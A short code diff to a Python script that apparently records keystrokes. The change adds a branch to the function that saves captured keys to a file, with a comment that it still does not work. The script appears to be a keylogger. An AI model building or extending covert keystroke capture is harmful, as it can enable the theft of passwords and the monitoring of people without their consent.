@@ -28,6 +28,9 @@ def save(keys):
                 file.write("\n")
             elif key.find("key") == -1:
                 file.write(key)
+            elif key.find('<255>') > 0: # Still doesn't Work.
+                file.write("\n")
+
 
 def release(key):
     if key == Key.esc:
